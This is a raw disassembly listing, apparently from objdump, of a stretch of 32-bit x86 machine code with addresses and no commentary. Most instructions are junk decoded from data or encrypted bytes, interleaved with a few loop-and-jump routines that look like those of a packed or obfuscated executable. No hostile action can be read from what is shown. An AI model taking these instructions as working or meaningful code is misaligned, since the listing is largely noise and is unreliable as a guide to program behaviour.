  411fe8:	imul   ecx,DWORD PTR [ecx-0x70205db5],0xffffffd6
  411fef:	jne    0x41203b
  411ff1:	mov    ebp,0x327254be
  411ff6:	mov    DWORD PTR [ecx],ebp
  411ff8:	inc    DWORD PTR [esi-0x15]
  411ffb:	pushf  
  411ffc:	jecxz  0x411f8a
  411ffe:	shl    BYTE PTR [ebx],1
  412000:	and    ah,BYTE PTR [edi+0x418846ff]
  412006:	mov    esi,0x3ff2ffe5
  41200b:	jl     0x41207d
  41200d:	add    ebx,DWORD PTR [edx]
  41200f:	dec    edi
  412010:	jle    0x411fbd
  412012:	repz jno 0x411f9c
  412015:	push   0x2b
  412017:	rcl    BYTE PTR [esp+ebp*1],cl
  41201a:	jg     0x412039
  41201c:	jae    0x411fb8
  41201e:	xor    edx,DWORD PTR [eax+0x37]
  412021:	mov    ebx,0xdcaaa889
  412026:	(bad)  
  412027:	sahf   
  412028:	dec    edx
  412029:	add    al,0x7b
  41202b:	jmp    0x1e7f:0x1afe5b9e
  412032:	jmp    0x5705b75e
  412037:	xor    dl,BYTE PTR [eax]
  412039:	dec    ebx
  41203a:	push   ds
  41203b:	stos   BYTE PTR es:[edi],al
  41203c:	and    eax,0xe8079a5a
  412041:	fild   WORD PTR [ebp-0x76]
  412044:	lods   al,BYTE PTR ds:[esi]
  412045:	sub    al,0x4c
  412047:	inc    edx
  412048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412049:	push   ecx
  41204a:	and    eax,0xc41f5847
  41204f:	xchg   ebx,eax
  412050:	not    BYTE PTR [eax-0x58484273]
  412056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412057:	out    dx,eax
  412058:	pop    esi
  412059:	push   ebp
  41205a:	pop    ds
  41205b:	sti    
  41205c:	push   ecx
  41205d:	xchg   ebx,eax
  41205e:	or     esp,DWORD PTR [ecx+0xf]
  412061:	inc    ecx
  412062:	retf   0x7665
  412065:	fwait
  412066:	dec    ebx
  412067:	outs   dx,DWORD PTR ds:[esi]
  412068:	sub    DWORD PTR [edi+0x78a65a9a],ebp
  41206e:	jbe    0x411ffb
  412070:	sbb    al,0x60
  412072:	cld    
  412073:	into   
  412074:	jnp    0x4120e8
  412076:	sar    BYTE PTR [edx+0x30],cl
  412079:	dec    edx
  41207a:	sbb    eax,0x5eb49850
  41207f:	ret    0x5974
  412082:	push   ss
  412083:	mov    al,0x5f
  412085:	xlat   BYTE PTR ds:[ebx]
  412086:	sub    eax,0xc56796ea
  41208b:	popf   
  41208c:	call   0xc2b82c36
  412091:	mov    dl,0xa0
  412093:	in     al,dx
  412094:	fmul   DWORD PTR [ebx+0x3f144f07]
  41209a:	pop    eax
  41209b:	inc    ebp
  41209c:	adc    eax,0xf4e6b460
  4120a1:	mov    BYTE PTR [esp+ebp*8+0x3a5799d8],ch
  4120a8:	repnz mov eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fdf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fd55
  4120d3:	adc    DWORD PTR ds:0x42e76f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e76b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e783,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e77b,0x19
  412102:	cmp    DWORD PTR ds:0x42e77b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e77b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fdfe
  412121:	push   0x0
  412123:	push   0x42e2ed
  412128:	call   DWORD PTR ds:0x42e503
  41212e:	mov    ebx,DWORD PTR ds:0x42e77b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e77b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e1a0,0x42fd81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	fdiv   DWORD PTR [edi+0x21]
  412170:	pop    DWORD PTR [esi+0x5f]
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x470707e
  41217a:	(bad)  
  41217b:	out    dx,eax
  41217c:	stos   DWORD PTR es:[edi],eax
  41217d:	ins    DWORD PTR es:[edi],dx
  41217e:	fidiv  WORD PTR [eax+0x3c]
  412181:	les    eax,FWORD PTR [ebx+0x7db139c7]
  412187:	mov    cl,0x76
  412189:	je     0x412158
  41218b:	adc    DWORD PTR [ecx],0x8f90c4cc
  412191:	mov    bh,bh
  412193:	xor    al,0x4c
  412195:	out    dx,al
  412196:	lods   eax,DWORD PTR ds:[esi]
  412197:	mov    cl,0x92
  412199:	and    al,0x12
  41219c:	push   ecx
  41219d:	in     eax,dx
  41219e:	ds jo  0x412148
  4121a1:	test   al,0xd3
  4121a3:	cmp    ecx,esp
  4121a5:	mov    fs,WORD PTR [esi-0x51ceb297]
  4121ab:	daa    
  4121ac:	sbb    BYTE PTR [ebx+0x12657034],0xb1
  4121b3:	push   esp
  4121b4:	cwde   
  4121b5:	sbb    eax,0x15547cde
  4121ba:	cmp    BYTE PTR [esi-0xa],dh
  4121bd:	pop    ecx
  4121be:	push   ebx
  4121bf:	adc    eax,0x5c484749
  4121c4:	cmc    
  4121c5:	test   al,ch
  4121c7:	bound  eax,QWORD PTR [edx+eax*8]
  4121ca:	push   es
  4121cb:	rcl    BYTE PTR [edx],cl
  4121cd:	or     al,0x6e
  4121cf:	pop    edi
  4121d0:	and    bh,BYTE PTR [eax+ebx*8-0x54]
  4121d4:	push   ebp
  4121d5:	mov    dl,0x21
  4121d7:	mov    edx,DWORD PTR [esi+eiz*4+0x31]
  4121db:	xor    BYTE PTR [edx+0x68d00e1d],0xac
  4121e2:	fisubr WORD PTR [edx+0x55a116c6]
  4121e8:	into   
  4121e9:	aaa    
  4121ea:	push   ebp
  4121eb:	mov    esi,0x979ba022
  4121f0:	push   es
  4121f1:	lahf   
  4121f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121f3:	adc    DWORD PTR [ecx],ebp
  4121f5:	add    ebx,DWORD PTR [ebx-0x22b1c33c]
  4121fb:	stc    
  4121fc:	and    al,0xd9
  4121fe:	add    eax,0x870dc78c
  412203:	setb   BYTE PTR [edx+0x63297306]
  41220a:	xchg   edi,eax
  41220b:	jb     0x412193
  41220d:	jl     0x4121ae
  41220f:	add    bl,dl
  412211:	fwait
  412212:	and    DWORD PTR [ebx],ebx
  412214:	out    dx,eax
  412215:	xor    eax,DWORD PTR [eax-0x78]
  412218:	adc    ebp,DWORD PTR [ecx-0x2580de7c]
  41221e:	fstp   TBYTE PTR [ebx+eax*4+0x4d]
  412222:	adc    BYTE PTR [ecx],0x33
  412225:	cmp    BYTE PTR [ebx-0x22],dh
  412228:	xlat   BYTE PTR ds:[ebx]
  412229:	dec    esi
  41222a:	cld    
  41222b:	and    ah,bh
  41222d:	ja     0x412298
  41222f:	dec    ebx
  412230:	mov    bl,0x9b
  412232:	adc    bl,BYTE PTR [ecx-0x16]
  412235:	and    al,0xa7
  412237:	sub    BYTE PTR es:0xb2e55f88,0x89
  41223f:	adc    al,0x3c
  412241:	repz xor al,dl
  412244:	jecxz  0x412204
  412246:	fnsave [edi-0x52]
  412249:	scas   al,BYTE PTR es:[edi]
  41224a:	jae    0x4121ef
  41224c:	xchg   edx,eax
  41224d:	push   0xfe18d6e2
  412252:	call   0x99e6:0x16ac98f0
  412259:	push   ecx
  41225a:	or     ebx,DWORD PTR [edi]
  41225c:	dec    eax
  41225d:	lock and al,0x32
  412260:	jl     0x412227
  412262:	xor    esi,edx
  412264:	es daa 
  412266:	jmp    0x4122ac
  412268:	xchg   edi,eax
  412269:	js     0x412216
  41226b:	or     ah,BYTE PTR [ecx+0xacbcb79]
  412271:	out    0x21,al
  412273:	lock scas al,BYTE PTR es:[edi]
  412275:	mov    bl,0x11
  412277:	xchg   ebx,eax
  412278:	pop    ebp
  412279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41227a:	jo     0x41223a
  41227c:	pop    ss
  41227d:	sub    edi,DWORD PTR gs:[edi+0x425914cc]
  412284:	mov    esp,DWORD PTR [edi]
  412286:	rol    BYTE PTR [edx-0x65],1
  412289:	pop    edx
  41228a:	cmc    
  41228b:	xor    edx,ebx
  41228d:	(bad)  
  41228f:	fwait
  412290:	je     0x412248
  412292:	rol    DWORD PTR [ebx],cl
  412294:	cs mov ebp,0x15f2c8a1
  41229a:	push   esi
  41229b:	dec    edi
  41229c:	xchg   edi,eax
  41229d:	lods   al,BYTE PTR ds:[esi]
  41229e:	loop   0x41227f
  4122a0:	add    al,0x28
  4122a2:	sub    ecx,DWORD PTR [edx+ebp*1]
  4122a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a6:	inc    edi
  4122a7:	fnstsw WORD PTR [ebx-0xdd3553c]
  4122ad:	loop   0x412249
  4122af:	sub    dh,bl
  4122b1:	xchg   BYTE PTR [ecx-0xcf7a15f],al
  4122b7:	mov    WORD PTR [edx+edx*2+0x58],fs
  4122bb:	adc    bh,BYTE PTR [edx+0x19928140]
  4122c1:	cmp    al,0x12
  4122c3:	cwde   
  4122c4:	mov    ds:0xfe27daf0,eax
  4122c9:	mov    dh,0x64
  4122cb:	ret    
  4122cc:	adc    dh,dl
  4122ce:	pop    ecx
  4122cf:	fcom   QWORD PTR [esi]
  4122d1:	mov    dl,bl
  4122d3:	sbb    BYTE PTR [esi+0x0],bl
  4122d6:	xchg   edi,eax
  4122d7:	sub    DWORD PTR [ebp-0x3e],eax
  4122da:	pop    ebx
  4122db:	xor    DWORD PTR cs:[ecx+0x56d29090],edi
  4122e2:	arpl   WORD PTR [esi+0x58395358],cx
  4122e8:	pop    esi
  4122e9:	jmp    0x3912a12f
  4122ee:	ret    0xa2e4
  4122f1:	shr    BYTE PTR [eax],0x92
  4122f4:	or     ecx,ecx
  4122f6:	pop    ecx
  4122f7:	sbb    ah,BYTE PTR [esi+0x5]
  4122fa:	enter  0xf444,0xa4
  4122fe:	push   ebx
  4122ff:	fsubr  DWORD PTR [ecx]
  412301:	mov    BYTE PTR [edi+0xe],bh
  412304:	xchg   esp,eax
  412305:	loop   0x412294
  412307:	cmp    BYTE PTR ds:0x81ec066c,0xec
  41230e:	in     eax,dx
  41230f:	shr    BYTE PTR [esi],1
  412311:	ja     0x41236e
  412313:	mov    WORD PTR [ecx-0x12],gs
  412316:	retf   0x4462
  412319:	dec    esi
  41231a:	xchg   ecx,eax
  41231b:	mov    ds:0x88773d1,al
  412320:	test   eax,0x6f535eef
  412325:	pusha  
  412326:	pop    ss
  412327:	neg    BYTE PTR [esp+ebx*2-0x3b]
  41232b:	mov    esp,esp
  41232d:	mov    eax,0xc8139fcc
  412332:	ficomp WORD PTR [ecx+esi*4+0x72c09b82]
  412339:	test   al,0x5d
  41233b:	xchg   ebx,eax
  41233c:	jno    0x41232d
  41233e:	stc    
  41233f:	jecxz  0x4123a0
  412341:	xchg   ecx,eax
  412342:	fdivr  QWORD PTR [eax-0x63]
  412345:	push   0xb7c224f
  41234a:	hlt    
  41234b:	pop    ss
  41234c:	cmp    esp,esp
  41234e:	shl    BYTE PTR [edx],cl
  412350:	ds jns 0x412379
  412353:	inc    esp
  412354:	cs jns 0x4122fa
  412357:	(bad)  
  412358:	xchg   edx,eax
  412359:	lock pop ss
  41235b:	jb     0x412309
  41235d:	jne    0x4123ca
  41235f:	sub    DWORD PTR [ecx],0xffffff8b
  412362:	mov    bl,ah
  412364:	sbb    bl,BYTE PTR [edi-0x42b95825]
  41236a:	mov    ebp,eax
  41236c:	adc    ecx,esp
  41236e:	daa    
  41236f:	and    al,0x36
  412371:	push   0xffffff88
  412373:	pop    eax
  412374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412375:	icebp  
  412376:	add    eax,0xe3ef1ffe
  41237b:	pushf  
  41237c:	ja     0x41237d
  41237e:	iret   
  41237f:	cmp    edx,esp
  412381:	mov    ebp,0xe386cbbf
  412386:	mov    eax,ds:0x3c1ad125
  41238b:	aam    0x77
  41238d:	cmp    cl,ah
  41238f:	icebp  
  412390:	fs dec esi
  412392:	aad    0x13
  412394:	cmp    al,BYTE PTR [eax]
  412396:	outs   dx,BYTE PTR ds:[esi]
  412397:	inc    ebx
  412398:	mov    ds:0x433763d7,eax
  41239d:	icebp  
  41239e:	and    al,0xcb
  4123a0:	jnp    0x4123d2
  4123a2:	int3   
  4123a3:	(bad)  
  4123a4:	in     al,dx
  4123a5:	inc    al
  4123a7:	gs push ss
  4123a9:	aas    
  4123aa:	(bad)  
  4123ab:	in     eax,0x34
  4123ad:	fild   QWORD PTR [edx+0x6f]
  4123b0:	mov    edx,0x538f86da
  4123b5:	jnp    0x412393
  4123b7:	lods   al,BYTE PTR ds:[esi]
  4123b8:	pushf  
  4123b9:	sbb    DWORD PTR [esi],ebx
  4123bb:	xor    eax,0xe1fe25e5
  4123c0:	std    
  4123c1:	int3   
  4123c2:	fmul   st,st(2)
  4123c4:	mov    ?,WORD PTR [edi+0x74]
  4123c7:	mov    edx,0x768fac16
  4123cc:	add    al,0xbd
  4123ce:	and    eax,0x24633726
  4123d3:	and    al,0x6
  4123d5:	xchg   edi,eax
  4123d6:	call   0x2628:0x75a5381c
  4123dd:	shl    BYTE PTR [esi+0x7223c85e],cl
  4123e3:	xchg   ebp,eax
  4123e4:	mov    eax,0x337a1924
  4123e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ea:	aad    0x16
  4123ec:	hlt    
  4123ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123ee:	lods   eax,DWORD PTR ds:[esi]
  4123ef:	mov    esi,0x89b58abb
  4123f4:	mov    dh,0x67
  4123f6:	fiadd  DWORD PTR [ecx]
  4123f8:	xor    BYTE PTR [ecx+edi*4+0x1a2c09e9],0x9c
  412400:	mov    DWORD PTR [ebx+0x3765505c],0x3f19a34c
  41240a:	or     BYTE PTR [edi+0x23699d63],dl
  412410:	sbb    BYTE PTR [edi],al
  412412:	jbe    0x4123b1
  412414:	inc    ebp
  412415:	pop    ds
  412416:	push   esp
  412417:	jae    0x412429
  412419:	sbb    al,0xd4
  41241b:	pop    eax
  41241c:	cmp    BYTE PTR [ebx-0x49],0x6f
  412420:	push   0xffffffbf
  412422:	ret    0x814d
  412425:	mov    al,0x3e
  412427:	popf   
  412428:	or     al,0x32
  41242a:	xlat   BYTE PTR ds:[ebx]
  41242b:	sbb    dl,cl
  41242d:	xchg   edi,eax
  41242e:	sub    BYTE PTR [edi-0x448996ee],dl
  412434:	loopne 0x4123e5
  412436:	inc    edi
  412437:	sti    
  412438:	imul   edi,DWORD PTR [edx+0x5],0x25
  41243c:	xor    eax,0x38af816
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fd79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	cli    
  41245e:	scas   al,BYTE PTR es:[edi]
  41245f:	mov    eax,DWORD PTR [ecx]
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xb870707e
  41246a:	dec    esi
  41246b:	mov    cl,0x20
  41246d:	or     DWORD PTR [edi],esp
  41246f:	mov    WORD PTR [ecx+0x38f69692],gs
  412475:	out    0xfb,eax
  412477:	adc    eax,0xcb505a65
  41247c:	jg     0x4124a6
  41247e:	das    
  41247f:	pop    ecx
  412480:	adc    eax,0x9bfc4098
  412485:	out    dx,eax
  412486:	shr    DWORD PTR [esi-0x3b2b60eb],cl
  41248c:	dec    edx
  41248d:	push   esi
  41248e:	dec    ecx
  41248f:	cmp    eax,DWORD PTR [eax-0x40]
  412492:	push   esi
  412493:	adc    BYTE PTR [ebp+0x75],dh
  412496:	pop    edi
  412497:	sub    dl,0x17
  41249a:	mov    ecx,ebx
  41249c:	push   ss
  41249d:	inc    esp
  41249e:	outs   dx,BYTE PTR ds:[esi]
  41249f:	outs   dx,BYTE PTR ds:[esi]
  4124a0:	sar    dl,0xb8
  4124a3:	xchg   esi,eax
  4124a4:	mov    ah,0x72
  4124a6:	jae    0x4124d8
  4124a8:	imul   eax,DWORD PTR [esi+0x3005b216],0x5
  4124af:	and    BYTE PTR [esi],bl
  4124b1:	or     edx,esp
  4124b3:	mov    eax,0x37254081
  4124b8:	rcl    BYTE PTR [edi-0x51],cl
  4124bb:	and    al,0xc4
  4124bd:	hlt    
  4124be:	ds out 0x16,eax
  4124c1:	das    
  4124c2:	jb     0x4124c5
  4124c4:	inc    edi
  4124c5:	rol    bl,0xbb
  4124c8:	(bad)
  4124cb:	mov    cl,0x84
  4124cd:	dec    edi
  4124ce:	jbe    0x41251e
  4124d0:	inc    edi
  4124d1:	addr16 jnp 0x412460
  4124d4:	or     cl,0xc5
  4124d7:	mov    ah,0x28
  4124d9:	das    
  4124da:	mov    al,ds:0xe10ecd0f
  4124df:	dec    edi
  4124e0:	add    DWORD PTR [edi+0x3c770ae0],edx
  4124e6:	pop    esp
  4124e7:	push   esi
  4124e8:	pop    ebx
  4124e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124ea:	stc    
  4124eb:	icebp  
  4124ec:	(bad)
  4124ef:	pop    edx
  4124f0:	pop    eax
  4124f1:	lods   eax,DWORD PTR ds:[esi]
  4124f2:	adc    BYTE PTR [ebx+0x642a862c],al
  4124f8:	fbstp  TBYTE PTR [eax+0x4e]
  4124fb:	fdiv   DWORD PTR [esi]
  4124fd:	push   es
  4124fe:	cmp    bh,dh
  412500:	inc    ebx
  412501:	adc    al,0xc8
  412503:	rcl    DWORD PTR [ebx],1
  412505:	sub    al,0xad
  412507:	and    dh,BYTE PTR [ebx+ecx*8-0x55d037d1]
  41250e:	dec    edx
  41250f:	shr    DWORD PTR [edx+0x468cb194],cl
  412515:	mov    eax,ds:0x9f53b9dd
  41251a:	stos   DWORD PTR es:[edi],eax
  41251b:	loop   0x4124c6
  41251d:	xchg   ebp,eax
  41251e:	fild   DWORD PTR [eax+0x7f]
  412521:	jnp    0x4124bf
  412523:	pop    ecx
  412524:	imul   eax,DWORD PTR [ebx+0xa7f2235],0x54
  41252b:	xchg   ebx,eax
  41252c:	jmp    FWORD PTR [eax-0x5404009b]
  412532:	pop    eax
  412533:	xchg   edi,eax
  412534:	cmp    BYTE PTR gs:[esi-0x5bfd361e],dl
  41253b:	pop    esp
  41253c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41253d:	loop   0x412596
  41253f:	push   es
  412540:	pextrw edx,(bad),0xc5
  412542:	xchg   ecx,eax
  412543:	dec    edi
  412544:	xor    eax,0xf9c29e19
  412549:	mov    al,ds:0xab28721
  41254e:	call   0x2e6d:0xb786aed5
  412555:	and    DWORD PTR [ebp-0x7],0x69
  412559:	inc    edi
  41255a:	in     al,0xc3
  41255c:	adc    esp,DWORD PTR [ebx+0x2750edd7]
  412562:	add    eax,0xbdc3c331
  412567:	sbb    esp,DWORD PTR [ebp+edx*2+0x5a6d6ee8]
  41256e:	add    BYTE PTR [ecx],bh
  412570:	(bad)  
  412571:	pop    esp
  412572:	retw   
  412574:	jnp    0x4125ec
  412576:	les    esi,FWORD PTR [edx]
  412578:	xchg   BYTE PTR [esi+0x3647a412],ch
  41257e:	mov    bh,0xd2
  412580:	mov    al,0x46
  412582:	imul   eax,DWORD PTR [edi+0x15550c82],0xffffffb8
  412589:	xacquire xchg DWORD PTR [esi+0x2251f263],edi
  412590:	mov    bh,0x42
  412592:	cwde   
  412593:	daa    
  412594:	test   al,0xd4
  412596:	xchg   ebp,eax
  412597:	daa    
  412598:	inc    edx
  412599:	push   ss
  41259a:	test   eax,0x8446dc8c
  41259f:	in     eax,dx
  4125a0:	jge    0x412592
  4125a2:	mov    ch,0x1b
  4125a4:	mov    esp,DWORD PTR [esi+esi*8]
  4125a7:	sub    cl,BYTE PTR [edi+0x38]
  4125aa:	rol    BYTE PTR [ebp+0x4a],0xf2
  4125ae:	imul   ebp,DWORD PTR [edi+0x50],0x5e
  4125b2:	xlat   BYTE PTR ds:[ebx]
  4125b3:	adc    eax,0x17f038e4
  4125b8:	and    BYTE PTR [edx-0x75],cl
  4125bb:	lea    ebp,[ebx-0x6b3d013b]
  4125c1:	inc    esp
  4125c2:	outs   dx,BYTE PTR ds:[esi]
  4125c3:	or     ebx,esp
  4125c5:	cmp    al,0xe3
  4125c7:	aas    
  4125c8:	sub    eax,0x8a126633
  4125cd:	int    0xce
  4125cf:	cmc    
  4125d0:	gs stc 
  4125d2:	mov    edi,0x4ad984b5
  4125d7:	adc    al,0x10
  4125d9:	jl     0x41258a
  4125db:	ds pop esi
  4125dd:	(bad)  
  4125de:	popf   
  4125df:	xchg   edi,eax
  4125e0:	and    DWORD PTR [ebp-0xd],eax
  4125e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125e4:	mov    dl,0x8a
  4125e6:	push   edi
  4125e7:	or     BYTE PTR ds:0x62d3cedf,0x7d
  4125ee:	fcmovb st,st(1)
  4125f0:	iret   
  4125f1:	aaa    
  4125f2:	loopne 0x412631
  4125f4:	aam    0xb5
  4125f6:	mov    ebx,0x878a8b56
  4125fb:	cmp    cl,BYTE PTR [eax-0x20f4ee8f]
  412601:	enter  0x594,0x49
  412605:	push   ebx
  412606:	inc    eax
  412607:	cmp    bl,dh
  412609:	jecxz  0x41267f
  41260b:	xchg   ebp,esp
  41260d:	inc    ebx
  41260e:	ror    BYTE PTR [ebx],1
  412610:	pop    esp
  412611:	push   0x2e
  412613:	xor    BYTE PTR [ecx+0x1a918f7d],bh
  412619:	xchg   DWORD PTR [eax+0x7ae7df00],esp
  41261f:	enter  0x64b6,0xa6
  412623:	dec    ebp
  412624:	mov    BYTE PTR [ebx],dl
  412626:	add    eax,0x485903dd
  41262b:	sub    dl,ch
  41262d:	push   ecx
  41262e:	std    
  41262f:	imul   DWORD PTR [edx-0x448cbaf7]
  412635:	inc    ebp
  412636:	repz xor ebp,ebp
  412639:	inc    esi
  41263a:	sub    edi,edx
  41263c:	mov    edx,0xadb68e06
  412641:	test   bh,ah
  412643:	mov    esp,0xeb852c9a
  412648:	push   0x58
  41264a:	pusha  
  41264b:	ret    
  41264c:	dec    esp
  41264d:	arpl   WORD PTR [ecx-0xf71881f],dx
  412653:	(bad)  
  412654:	sbb    DWORD PTR [eax-0x611b6e95],ecx
  41265a:	mov    BYTE PTR [ecx+eiz*8+0x34],bh
  41265e:	leave  
  41265f:	dec    ebp
  412660:	leave  
  412661:	pop    ss
  412662:	sub    BYTE PTR [esi],dl
  412664:	iret   
  412665:	sub    dl,BYTE PTR [ebx+ebp*8+0x29]
  412669:	jl     0x4126a0
  41266b:	mov    fs,esi
  41266d:	out    dx,eax
  41266e:	xor    BYTE PTR [ecx-0x16],dh
  412671:	or     cl,BYTE PTR [edx+0x15]
  412674:	mov    ah,0x25
  412676:	jle    0x412683
  412678:	mov    ds:0xe0277e66,eax
  41267d:	or     BYTE PTR [eax+0x54],dl
  412680:	es jae 0x412666
  412683:	dec    ecx
  412684:	adc    dh,BYTE PTR [eax+0x58]
  412687:	push   esp
  412688:	(bad)  
  41268b:	ss retf 
  41268d:	test   eax,0xfcca03f
  412692:	je     0x41265c
  412694:	push   0x43
  412696:	outs   dx,BYTE PTR ds:[esi]
  412697:	and    eax,0xda0dbbe0
  41269c:	mov    BYTE PTR [ebx],bl
  41269e:	push   edi
  41269f:	jge    0x412637
  4126a1:	imul   edx,ebp,0xb839b8d
  4126a7:	cmp    dh,BYTE PTR [esi+ebp*2-0x6]
  4126ab:	nop
  4126ac:	sbb    BYTE PTR [ecx],cl
  4126ae:	lods   al,BYTE PTR ds:[esi]
  4126af:	mov    si,0xb0e7
  4126b3:	mov    bl,0x55
  4126b5:	sub    DWORD PTR [ebx],ebp
  4126b7:	push   ecx
  4126b8:	test   al,0xab
  4126ba:	jp     0x412716
  4126bc:	enter  0xab19,0xd7
  4126c0:	(bad)  
  4126c1:	fisttp WORD PTR [edx]
  4126c3:	(bad)  
  4126c4:	xor    eax,0x5882bf4f
  4126c9:	xchg   esi,eax
  4126ca:	jmp    0x88f62ee9
  4126cf:	mov    ds:0xcd171cab,eax
  4126d4:	or     ah,BYTE PTR [esi]
  4126d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d7:	int3   
  4126d8:	(bad)  
  4126d9:	push   ds
  4126da:	cmc    
  4126db:	inc    ebp
  4126dc:	mov    dl,0x8e
  4126de:	out    0xda,eax
  4126e0:	mov    DWORD PTR [edx],ebp
  4126e2:	push   ebx
  4126e3:	dec    edx
  4126e4:	dec    ebp
  4126e5:	dec    ecx
  4126e6:	sub    ebp,DWORD PTR [eax+ebx*4]
  4126e9:	add    cl,BYTE PTR ss:[eax]
  4126ec:	sahf   
  4126ed:	fld    QWORD PTR [ebp+0xd]
  4126f0:	jecxz  0x4126c8
  4126f2:	xchg   ebx,eax
  4126f3:	mov    al,0x5d
  4126f5:	push   esi
  4126f6:	out    0xd6,eax
  4126f8:	adc    al,BYTE PTR [ecx-0x48]
  4126fb:	or     esi,DWORD PTR [esi]
  4126fd:	cmp    dh,bh
  4126ff:	pop    edx
  412700:	ret    
  412701:	(bad)  [ecx-0x4ba108c2]
  412707:	mov    al,0x52
  412709:	sbb    eax,0x89577481
  41270e:	ins    BYTE PTR es:[edi],dx
  41270f:	fisub  WORD PTR [ebx+0x78b49d8e]
  412715:	dec    eax
  412716:	push   es
  412717:	sub    al,0x81
  412719:	js     0x412779
  41271b:	fdiv   QWORD PTR [edi]
  41271d:	add    DWORD PTR [ebp-0x49],edi
  412720:	push   0x409b4e73
  412725:	and    eax,0x5c2e96b0
  41272a:	or     eax,DWORD PTR [eax+ecx*8-0x7c]
  41272e:	xor    al,0x76
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fdf6,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fdf6
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fdf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fdf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fdf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e393
  41277c:	cmp    DWORD PTR ds:0x42fdf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fdf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fdf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fdee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esi,esp
  4127be:	dec    ebp
  4127bf:	fwait
  4127c0:	hlt    
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x4e70707e
  4127ca:	sub    DWORD PTR [eax],edx
  4127cc:	into   
  4127cd:	js     0x412750
  4127cf:	scas   al,BYTE PTR es:[edi]
  4127d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127d1:	clc    
  4127d2:	inc    ebx
  4127d3:	sub    DWORD PTR [ebp-0x3da06748],eax
  4127d9:	xchg   BYTE PTR [eax+esi*4],bh
  4127dc:	mov    bh,BYTE PTR fs:[edi+0x6170e950]
  4127e3:	sub    eax,0x621b1685
  4127e8:	not    DWORD PTR gs:[ebp+eiz*8+0x6d875b58]
  4127f0:	mov    edx,0x66beacd8
  4127f5:	shr    BYTE PTR [ebp-0x71],cl
  4127f8:	gs dec edi
  4127fa:	or     eax,0xc6deb20a
  4127ff:	jg     0x4127f4
  412801:	mov    al,ds:0xd3fb35f5
  412806:	rol    ebp,0x94
  412809:	add    BYTE PTR [eax+0x3a2234d9],ah
  41280f:	(bad)
  412812:	sbb    DWORD PTR [edi],esp
  412814:	mov    ecx,0xcddd910e
  412819:	inc    bl
  41281b:	sahf   
  41281c:	xor    esp,DWORD PTR [ecx+edx*2]
  41281f:	aas    
  412820:	push   cs
  412821:	pop    ebp
  412822:	push   es
  412823:	cmp    al,0x15
  412825:	int    0x8d
  412827:	fidiv  WORD PTR [edx]
  412829:	call   0xe9fb:0xac3fab83
  412830:	sbb    BYTE PTR [edx],0x75
  412833:	call   0x8884490d
  412838:	mov    WORD PTR [ebx],cs
  41283a:	hlt    
